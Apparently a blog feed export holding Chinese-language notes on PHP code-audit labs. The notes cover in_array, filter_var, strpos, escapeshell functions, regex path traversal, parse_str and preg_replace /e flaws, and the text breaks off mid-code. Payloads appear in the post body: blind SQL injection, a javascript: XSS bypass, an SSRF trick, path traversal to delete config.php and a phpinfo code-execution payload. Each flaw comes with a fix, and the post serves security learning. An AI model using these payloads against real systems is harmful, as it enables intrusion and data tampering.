Rbx2lfh8xteLcIOVR7rNqZJ6madsRs5mRMEwy+8KWbcTJfSAMsjtcsVwyFLfE6lHu6yc6PCbFOqGCfljsUw2q8gxyT48EgUG8L9Iw+6qHn3TJNoB3lGhq8LuqLSDUOOqayz9/hf8POVTGkq+aQFuM7vz/SawLpL+xJ9iCvt4A9KeEY3YB0eGaxLfwcq+lqHL1abXVk+fChVReOABa5tKAtC4VgQRZuUCp33AcGE4dVMOq6tuRbjwRWTFZ+rOwvf541Dglss4IuOkMPtB6533rqT8ULjZ3wQ03J/7HkiX4POxEitZCEAeiUf0SjiHTOFHANqmXYPvnEQKwuyJ0Iv4IgnvfSsKlMDANwfMrsO1PZVo8JShg+13vlUT5lVzlyeAHJLbXL6BSsVvzC7kosvROiXbRKrQwNiy57rREcWkNzoHF1KYrZcdnQ6nuGvtTNaEb2s6jn6PRyUf9vBVo4tsQjzXaYy4tN4jMqfzXWl7BBsTs/VQwRJN3J3+++WG1VUGTXIx/CzvmTXVnDFYYjwmAQ6pAgQ7tSLDwfRZBLc5sMafyV0srOPKsWY4gW5ZiZyoGN/wHu1FAKm5ZuzNWRP+j/TBM/e0a6r7iBNV3zsX9GUaW4L4iETweCdTGZmZwFEQbjNKu9GIl7Bptx98PipOi6omKyaPAhtmAOQgqtALQvVu/2JQpDVFSHeireCF7+Pna6XjMqPUgdNw+fRmJUSxghpIebJQ61GkmBSStfJEu+h58aDkIrtk+iSTx7rVOFXG+7Hzi7UZE7AvPWJwUuKC7L8OsZGiuVyonPaUzbCvnQxDhkpiOuX3n+oT52HBV6T35y9Uhlvl6XOLCRmxbmcHPy9wroawNQYg2/u6idlTjyVz/Ybs9gQoZm70WCxM6Phdswvrkq40zlCNGctxRAHqrzyAezouAs/ErX8mmFg7dKMpiOSfSFIeK2KrKbJOf9jgcNKu0AWygNoiehljk8fVpXJ3Z39ox2oSpIb6VfFMXyDFKkH1Pt4ipO7Ep6vdvPUhKvcMXsvEoI/IWLWSd+qBcNxqtx4nKNI8HyxiF6QsOnTWxKuwRhBmjhFWtV9LcodVVCUlG2gpRyief7lRpJvgbLDmWuLgasU=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏漏洞挖掘——待补充</title>
      <link href="/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/"/>
      <url>/2022/04/23/%E6%B8%B8%E6%88%8F%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E2%80%94%E2%80%94%E5%BE%85%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="游戏漏洞挖掘"><a href="#游戏漏洞挖掘" class="headerlink" title="游戏漏洞挖掘"></a>游戏漏洞挖掘</h1><h2 id="1、游戏实名认证"><a href="#1、游戏实名认证" class="headerlink" title="1、游戏实名认证"></a>1、游戏实名认证</h2><p>输入假的sfz号码 能过认证成功 &#x3D;&#x3D;漏洞</p><p>tx低危 sn高危</p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红日安全代码审计学习(一)</title>
      <link href="/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/"/>
      <url>/2022/04/20/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="红日安全代码审计学习"><a href="#红日安全代码审计学习" class="headerlink" title="红日安全代码审计学习"></a>红日安全代码审计学习</h1><p>项目地址：</p><p><a href="https://github.com/hongriSec/PHP-Audit-Labs#">https://github.com/hongriSec/PHP-Audit-Labs#</a></p><p>记录一下自己的学习过程</p><p>顺便加上一些自己的理解</p><span id="more"></span><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><h3 id="in-array函数缺陷"><a href="#in-array函数缺陷" class="headerlink" title="in_array函数缺陷"></a><strong>in_array函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day1/files/README.md">in_array函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.in-array.php"> <strong>in_array</strong> </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：检查数组中是否存在某个值</p><p><strong>定义</strong> ： <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code></p><p>在 <strong>$haystack</strong> 中搜索 <strong>$needle</strong> ，如果第三个参数 <strong>$strict</strong> 的值为 <strong>TRUE</strong> ，则 <strong>in_array()</strong> 函数会进行强检查，检查 <strong>$needle</strong> 的类型是否和 <strong>$haystack</strong> 中的相同。如果找到 <strong>$haystack</strong> ，则返回 <strong>TRUE</strong>，否则返回 <strong>FALSE</strong>。</p></blockquote><p>in_array()第三个参数未设置为true时，是弱匹配。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span><span class="keyword">shell</span>.php </span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">7 </span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">1</span>,<span class="number">1</span> and if(ascii(substr((select database()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">112</span>,<span class="number">1</span>,sleep(<span class="number">3</span>)));#</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D; </p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span> </span><br></pre></td></tr></table></figure><h4 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h4><p>文件上传、SQL注入白名单绕过</p><h4 id="修复建议："><a href="#修复建议：" class="headerlink" title="修复建议："></a>修复建议：</h4><p>1、第三个参数设置为 <strong>true</strong></p><p>2、使用正则匹配来处理变量</p><h3 id="filter-var函数缺陷"><a href="#filter-var函数缺陷" class="headerlink" title="filter_var函数缺陷"></a><strong>filter_var函数缺陷</strong></h3><p>github地址：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day2/files/README.md">filter_var函数缺陷</a></p><blockquote><p><a href="http://php.net/manual/zh/function.filter-var.php"> <strong>filter_var</strong> </a>： (PHP 5 &gt;&#x3D; 5.2.0, PHP 7)</p><p><strong>功能</strong> ：使用特定的过滤器过滤一个变量</p><p><strong>定义</strong> ：<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> &#x3D; FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p></blockquote><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = filter<span class="constructor">_var($<span class="params">_GET</span>[&#x27;<span class="params">url</span>&#x27;],FILTER_VALIDATE_URL)</span>;</span><br><span class="line">var<span class="constructor">_dump($<span class="params">url</span>)</span>;</span><br></pre></td></tr></table></figure><p>我们用<strong>FILTER_VALIDATE_URL</strong>过滤器做测试。</p><p>可以使用 <strong>:&#x2F;&#x2F;</strong> 来绕过。</p><p>由于原文没有讲清楚为什么可以绕过，本人测试了一下应该是因为filter_var函数在使用<strong>FILTER_VALIDATE_URL</strong>过滤器时，只要参数中含有 <strong>:&#x2F;&#x2F;</strong> 就视作为有效的URL。</p><p><strong><a href="http://www.baidu.com/">http://www.baidu.com</a> 是有效的URL</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202347838.png"></p><p><strong><a href="ftp://www.baidu.com是有效url/">ftp://www.baidu.com是有效URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202354607.png"></p><p><strong>0:&#x2F;&#x2F;<a href="http://www.baidu.com也是有效url,注意这个,这里可以作为一个ssrf的小trick/">www.baidu.com也是有效URL，注意这个，这里可以作为一个SSRF的小trick</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202355795.png"></p><p><strong>而<a href="http://www.baidu.com是无效的url/">www.baidu.com是无效的URL</a></strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204202356483.png"></p><h4 id="利用场景：-1"><a href="#利用场景：-1" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XSS绕过</p><p>XSS场景可以使用Javascript伪协议进行绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> <strong>&#x2F;&#x2F;</strong> 在JavaScript中表示单行注释， 对**%** 百分号编码成 <strong>%25</strong>，我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行</p><p>程序将浏览器发来的payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment％<span class="number">250</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 先解码成： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">javascript</span>://comment%<span class="number">0</span>aalert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p> 存储在可回显在页面上变量中，然后用户点击就会触发<strong>alert</strong>函数，弹窗。</p><p><strong>SSRF trick</strong></p><p><strong>看这篇文章</strong></p><p><a href="https://www.anquanke.com/post/id/101058">https://www.anquanke.com/post/id/101058</a></p><h4 id="修复建议：-1"><a href="#修复建议：-1" class="headerlink" title="修复建议："></a>修复建议：</h4><p>对于XSS的话，最好是过滤关键词+实体化编码。</p><p>对于ssrf的话，建议正则匹配吧。</p><h3 id="实例化任意对象漏洞"><a href="#实例化任意对象漏洞" class="headerlink" title="实例化任意对象漏洞"></a>实例化任意对象漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day3/files/README.md">红日安全]代码审计Day3 - 实例化任意对象漏洞</a></p><p>这个漏洞类似于php任意代码执行了</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210028203.png"></p><p>实例化类的类名和传入类的参数均在用户的控制之下，攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行。</p><p>先看看 <strong>SimpleXMLElement</strong> 类的定义：</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p><p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210103549.png"></p><p>data：格式正确的XML字符串，当参数<code>data_is_url</code>是<code>True</code>时，传入一个URL字符串</p><p>options：（可选）用于指定其他Libxml参数。</p><p><strong>SimpleXMLElement</strong> 导致的XXE攻击：</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204210034481.png"></p><h4 id="利用场景：-2"><a href="#利用场景：-2" class="headerlink" title="利用场景："></a>利用场景：</h4><p>XXE</p><h4 id="修复建议：-2"><a href="#修复建议：-2" class="headerlink" title="修复建议："></a>修复建议：</h4><p>可以修改代码，不要用这种可控的参数形式。</p><p>然后提一下对XXE漏洞进行修复，可以禁止加载XML实体对象。</p><h3 id="strpos使用不当引发漏洞"><a href="#strpos使用不当引发漏洞" class="headerlink" title="strpos使用不当引发漏洞"></a>strpos使用不当引发漏洞</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day4/files/README.md">红日安全]代码审计Day4 - strpos使用不当引发漏洞</a>&#96;</p><p>结合具体场景代码</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220113952.png"></p><p>代码在 <strong>第8行</strong> 和 <strong>第9行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 &lt; 和 &gt; 符号，猜测开发者应该是考虑到非法字符注入问题。</p><blockquote><p><strong><a href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置</p><p>作用：主要是用来查找字符在字符串中首次出现的位置。</p><p>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;a&#x27;</span>));   <span class="comment">#0</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">strpos</span>(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;x&#x27;</span>));   <span class="comment">#false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面场景代码中核心判断代码是</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!strpos($user,&#x27;&lt;&#x27;) || !strpos($user,&#x27;&gt;&#x27;)) &amp;&amp; (!strpos($pass,&#x27;&lt;&#x27;) || !strpos($pass,&#x27;&gt;&#x27;))</span><br></pre></td></tr></table></figure><p>作者考虑到可能有黑客会在登陆点进行SQL注入测试，所以判断了一下是否出现 <strong>‘&lt;’** 或 **’&gt;’</strong> 若出现则strpos函数获得出现位置，再配合  <strong>!</strong>  取反得到false</p><p>先不说strpos函数的问题，这段代码的逻辑就有问题，如果$user只出现了&gt;或&lt;号但$pass没有出现&gt;或&lt;号，那么依然可以判定成功。</p><p>例如这样</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220131557.png"></p><p>再说回strpos函数的绕过，因为strpos函数是取字符位置，但是如果取到了位置为<strong>0</strong>，那么通过！取反得到的就会是<strong>true</strong>了，就会导致判断成功，代码如下</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204220134822.png"></p><h4 id="利用场景：-3"><a href="#利用场景：-3" class="headerlink" title="利用场景："></a>利用场景：</h4><p>ctf印象中见过</p><h4 id="修复建议：-3"><a href="#修复建议：-3" class="headerlink" title="修复建议："></a>修复建议：</h4><p>代码逻辑优化</p><p>或者登录验证那块不要这么写了（真要防止SQL注入，这样写会不会太儿戏了。。。）</p><h3 id="escapeshellarg与escapeshellcmd使用不当"><a href="#escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="escapeshellarg与escapeshellcmd使用不当"></a>escapeshellarg与escapeshellcmd使用不当</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md">红日安全]代码审计Day5 - escapeshellarg与escapeshellcmd使用不当</a></p><p>原理：</p><p><strong>escapeshellarg()</strong> </p><p>将转码任何已经存在的单引号</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>这里稍微解释一下</p><p>其实是变成了三个字符串的连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\<span class="string">&#x27; #这里是escapeshellarg函数的效果 原来的单引号前面加上\转义</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;-v -d a=1&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>escapeshellcmd</strong>函数</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗  shell 命令执行任意命令的字符进行转义。</p><p>反斜线（\）会在以下字符之前插入：   <code>&amp;#;</code>|*?~&lt;&gt;^()[]{}$`, <code>\x0A</code>   和 <code>\xFF</code>。 <code>&#39;</code> 和 <code>&quot;</code>   仅在不配对儿的时候被转义。   </p><p>当**escapeshellarg()<strong>与</strong>escapeshellcmd()**一起使用时就会出现参数逃逸漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;127.0.0.1&#x27; -v -d a=1&quot;</span>;</span><br><span class="line"><span class="variable">$test2</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$test2</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>\\<span class="string">&#x27;&#x27;</span> -v -d a=<span class="number">1</span>\<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>依然是变成了三个部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;1270.0.1&#x27;</span> <span class="comment">#没有发生转义 单引号是配对的</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\<span class="string">&#x27;&#x27;</span>  <span class="comment">#从之前的\&#x27; 变成 \\&#x27; 这回是反斜线被转义了 所以单引号是多出来的正好与之前的第三部分的第一个单引号配对了</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-v -d a=<span class="number">1</span>\<span class="string">&#x27; #因为第二部分配对了 导致第三部分的单引号多余了 所以根据函数规则 未匹配的单引号会加上反斜线转义</span></span><br></pre></td></tr></table></figure><h4 id="利用场景：-4"><a href="#利用场景：-4" class="headerlink" title="利用场景："></a>利用场景：</h4><p>参数逃逸导致远程代码执行</p><p>ctf也有遇到过</p><h4 id="修复建议：-4"><a href="#修复建议：-4" class="headerlink" title="修复建议："></a>修复建议：</h4><p>不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤</p><h3 id="正则使用不当导致的路径穿越问题"><a href="#正则使用不当导致的路径穿越问题" class="headerlink" title="正则使用不当导致的路径穿越问题"></a>正则使用不当导致的路径穿越问题</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day6/files/README.md">红日安全]代码审计Day6 - 正则使用不当导致的路径穿越问题</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230021968.png"></p><p>本质上是对正则表达式的绕过</p><p><strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code>  表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../ config.php</span><br></pre></td></tr></table></figure><p>即可删除config.php文件</p><h4 id="利用场景：-5"><a href="#利用场景：-5" class="headerlink" title="利用场景："></a>利用场景：</h4><p>本质是对正则的绕过，只要正则写的不完善，都可以进行绕过尝试。</p><p>CTF中也有出现过。</p><h4 id="修复建议：-5"><a href="#修复建议：-5" class="headerlink" title="修复建议："></a>修复建议：</h4><p>结合业务修改完善正则表达式。</p><h3 id="parse-str函数缺陷"><a href="#parse-str函数缺陷" class="headerlink" title="parse_str函数缺陷"></a>parse_str函数缺陷</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day7/files/README.md">红日安全]代码审计Day7 - parse_str函数缺陷</a></p><p>这个函数的缺陷实际上导致的是一个<strong>变量覆盖</strong>漏洞。</p><blockquote><p><a href="http://php.net/manual/zh/function.parse-str.php"> <strong>parse_str</strong> </a></p><p><strong>功能</strong> ：parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量。</p><p><strong>定义</strong> ：<code>void parse_str( string $encoded_string [, array &amp;$result ] )</code></p><p>如果 <strong>encoded_string</strong> 是 URL 传入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204230119878.png"></p><h4 id="利用场景：-6"><a href="#利用场景：-6" class="headerlink" title="利用场景："></a>利用场景：</h4><p>白盒审计</p><p>ctf遇到过</p><h4 id="修复建议：-6"><a href="#修复建议：-6" class="headerlink" title="修复建议："></a>修复建议：</h4><p>在注册变量前先判断变量是否存在</p><h3 id="preg-replace函数之命令执行"><a href="#preg-replace函数之命令执行" class="headerlink" title="preg_replace函数之命令执行"></a>preg_replace函数之命令执行</h3><p>[<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md">红日安全]代码审计Day8 - preg_replace函数之命令执行</a></p><blockquote><p><a href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p><p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p><p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p><p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p></blockquote><ul><li><strong>$pattern</strong> 存在 <strong>&#x2F;e</strong> 模式修正符，允许代码执行</li><li><strong>&#x2F;e</strong> 模式修正符，是 **preg_replace() ** 将 <strong>$replacement</strong> 当做php代码来执行</li></ul><p>总结就是 php5.5版本以下，<strong>preg_replace</strong>函数有一个&#x2F;e模式，开启了就会导致代码执行。</p><p><strong>经典问题案例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span>(<span class="params"> <span class="variable">$regex</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$regex</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complexStrtolower</span>(<span class="variable">$regex</span>, <span class="variable">$value</span>).<span class="string">&quot;n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>preg_replace 使用了 &#x2F;e 模式，导致可以代码执行，我们可以控制第一个和第三个参数，第二个参数固定为 ‘strtolower(“\1”)’ 字符串。</p><p>上面的命令执行，相当于 <strong>eval(‘strtolower(“\1”);’)</strong></p><p>如何进行命令执行其他恶意代码？</p><p>这里要用到一个PHP的小<strong>trick</strong>，<strong>反向引用</strong>。</p><p>看了几篇文章，感觉讲的不是很清楚，这里解释一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">反向引用</span><br><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，</span><br><span class="line">所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。</span><br><span class="line">缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 <span class="string">&#x27;\n&#x27;</span> 访问，</span><br><span class="line">其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">camelize</span>(<span class="params"><span class="variable">$word</span></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(^|_)([a-z])/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\2&quot;)&#x27;</span>, <span class="variable">$word</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码，就是捕获匹配的 <code>(^|_)</code> 和 <code>([a-z])</code> 部分。它们从 1 开始编号，因此您有反向引用 1 和 2。</p><p>1是正则  **(^|_) ** 所匹配到的东西，2是  <strong>([a-z])</strong>  所匹配到的东西。这里还有一个隐藏点 <strong>0 是整个匹配的字符串</strong> 很多文章没讲到这个。</p><p>回到上面的代码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span>. <span class="variable">$regex</span>.<span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\1&quot;)&#x27;</span>,<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure><p>第二个参数中的\\1，实际上就是\1，配合反向引用的规则，\1就是指第一个子匹配项。</p><p>那上面的命令执行，就相当于 <strong>eval(‘strtolower(“满足正则表达式的$value”);’)</strong></p><p>官方 <strong>payload</strong> 为： <strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong></p><p><strong>.</strong>* 正则匹配任意多个字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先的语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(&#x27;</span> . <span class="variable">$regex</span> . <span class="string">&#x27;)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line">变成了语句： <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span 